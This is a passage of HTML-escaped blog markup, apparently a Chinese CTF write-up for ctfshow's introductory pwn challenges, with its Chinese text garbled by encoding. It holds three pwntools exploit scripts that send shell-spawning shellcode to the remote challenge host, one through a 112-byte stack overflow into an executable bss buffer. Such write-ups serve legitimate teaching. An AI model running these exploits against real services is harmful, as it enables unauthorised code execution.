	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/199_hu_90e10171a73e5174.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/199_hu_e7ef58fcbe3b0e15.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;176&#34;
		data-flex-basis=&#34;423px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œçœ‹åˆ°è°ƒç”¨getså‡½æ•°äº†ï¼Œå‚æ•°å¯¹åº”çš„æ˜¯ [ebp+s] çš„åœ°å€,ä¹Ÿå°±æ˜¯åœ¨è¿”å›åœ°å€ä¸Šä¸€æ ˆå†…å­˜å•å…ƒå¤„ï¼Œæ¥ç€å¾€ä¸‹å°±æ˜¯è°ƒç”¨putså‡½æ•°äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/200.png&#34;
	width=&#34;799&#34;
	height=&#34;578&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/200_hu_60d7edb98ce367f7.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/200_hu_f340d09493ddcca3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;138&#34;
		data-flex-basis=&#34;331px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ç´§æ¥ç€å°±æ˜¯ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/201.png&#34;
	width=&#34;1074&#34;
	height=&#34;535&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/201_hu_46ecca29bb84491b.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/201_hu_9ad4dde3c4d2423a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;200&#34;
		data-flex-basis=&#34;481px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ä»è¿™å¯çœ‹å‡ºï¼Œgetså‡½æ•°è¯»å…¥å­˜è¿›[ebp+s]è¿™å—çš„å†…å­˜ï¼Œåˆ°putsã€ctfshowä¸»å‡½æ•°éƒ½ä¼šè¯»å–å…¶ä¸­å†…å®¹è°ƒç”¨ï¼Œé‚£æˆ‘ä»¬å¾€è¿™å—æ³¨å…¥shellcodeä¸å°±å¥½äº†å—ï¼Ÿ&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28118&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å½“ç„¶shellcodeè¿™éƒ¨åˆ†ä½ å¯ä»¥é€‰æ‹©æ‰‹æ•²æ±‡ç¼–ä»£ç è¿›å»ï¼Œè¿™é‡Œç”¨äº†shellcraftæ¨¡å—ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_059&#34;&gt;PWN_059
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š64ä½ æ— é™åˆ¶ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_059&#34; &gt;PWN_059&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;åˆ†ææµç¨‹åŒä¸Šï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨ç”Ÿæˆshellcodeçš„æ—¶å€™éœ€è¦æ³¨æ˜æ¶æ„ä¸º64ä½ï¼š&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28204&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#recv()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_060&#34;&gt;PWN_060
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå…¥é—¨éš¾åº¦shellcodeã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_060&#34; &gt;PWN_060&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IDA32åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/202.png&#34;
	width=&#34;766&#34;
	height=&#34;241&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/202_hu_62e54366fd6cb2ae.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/202_hu_5a8410ec937a91fe.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;317&#34;
		data-flex-basis=&#34;762px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å‘ç°getså‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨strncpyå‡½æ•°å°†å¯¹åº”çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ° buf2 å¤„ã€‚è·Ÿè¿›æŸ¥çœ‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/203.png&#34;
	width=&#34;891&#34;
	height=&#34;253&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/203_hu_8bac13b915311301.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/203_hu_c7eb78038416691f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;bssæ®µ&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;352&#34;
		data-flex-basis=&#34;845px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°buf2åœ¨bssæ®µï¼Œåœ°å€ï¼š0x804A080&lt;/p&gt;
&lt;p&gt;ç”¨gdbè°ƒè¯•æŸ¥çœ‹bssæ˜¯å¦æœ‰æ‰§è¡Œæƒé™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gdb pwn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;break&lt;/span&gt; main
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vmmap
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/204.png&#34;
	width=&#34;1169&#34;
	height=&#34;719&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/204_hu_a7c8df1eb90cff4.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/204_hu_df2f362f2b92ed2f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;162&#34;
		data-flex-basis=&#34;390px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;buf2æ‰€åœ¨çš„bsså†…å­˜æ®µç¡®å®æœ‰rwxæƒé™ï¼Œé‚£æˆ‘ä»¬ç›´æ¥æ³¨å…¥shellcodeåˆ°buf2è¿è¡Œå°±å¯ä»¥ã€‚&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28171&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf2_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x804A080&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;lenth&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lenth&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2_address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ä½ ä¼šçœ‹åˆ°ä¸ºä»€ä¹ˆæ˜¯112ï¼Ÿä¸åº”è¯¥æ˜¯104å—ï¼Ÿ100å­—èŠ‚+ebpæœ¬èº«çš„4å­—èŠ‚ï¼Œè¿˜æœ‰8å­—èŠ‚å“ªæ¥çš„ï¼Ÿè®°ä½ä»¥ä¸‹è§„åˆ™ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;â€œå¤šå¡«å…… 8 å­—èŠ‚â€ å¹¶ééšæ„è®¾ç½®ï¼Œè€Œæ˜¯&lt;strong&gt;ç”±ç¨‹åºå®é™…æ ˆå¸§ç»“æ„å†³å®šçš„&lt;/strong&gt;â€”â€” å¯èƒ½æ˜¯ç¼–è¯‘å™¨çš„æ ˆå¯¹é½ç­–ç•¥ï¼Œä¹Ÿå¯èƒ½æ˜¯éšå¼å±€éƒ¨å˜é‡å ç”¨ç©ºé—´ï¼Œæœ€ç»ˆé€šè¿‡è°ƒè¯•ç¡®è®¤ â€œåªæœ‰å¡«å……è‡³ 112 å­—èŠ‚æ‰èƒ½è¦†ç›–è¿”å›åœ°å€â€ã€‚è¿™ä¹Ÿç¬¦åˆ PWN é¢˜çš„é€šç”¨åŸåˆ™ï¼šæ ˆæº¢å‡ºçš„å¡«å……é•¿åº¦éœ€ä»¥ â€œå®é™…è°ƒè¯• / é€†å‘ç»“æœâ€ ä¸ºå‡†ï¼Œè€Œéä»…ä¾èµ–ç†è®ºè®¡ç®—çš„ â€œç¼“å†²åŒºå¤§å° + æ—§ EBPâ€ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ä¸è¿‡åœ¨æ–°ç‰ˆæœ¬çš„Ubuntuè™šæ‹Ÿæœºä¸­å°±å¯èƒ½ä¼šè¯¯å¯¼ä½ ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/205.png&#34;
	width=&#34;1010&#34;
	height=&#34;475&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/205_hu_a3b5e06235441d9b.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/205_hu_82fa9f9066716311.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;åœ¨Ubuntu24.04çš„gdbè°ƒè¯•æƒ…å†µ&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;212&#34;
		data-flex-basis=&#34;510px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;çµæ´»æŒæ§shellcodeé•¿åº¦&#34;&gt;&lt;strong&gt;çµæ´»æŒæ§shellcodeé•¿åº¦&lt;/strong&gt;
&lt;/h3&gt;&lt;h3 id=&#34;pwn_061&#34;&gt;PWN_061
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šè¾“å‡ºäº†ä»€ä¹ˆï¼Ÿ &lt;a class=&#34;link&#34; href=&#34;PWN_061&#34; &gt;PWN_061&lt;/a&gt;&lt;/p&gt;
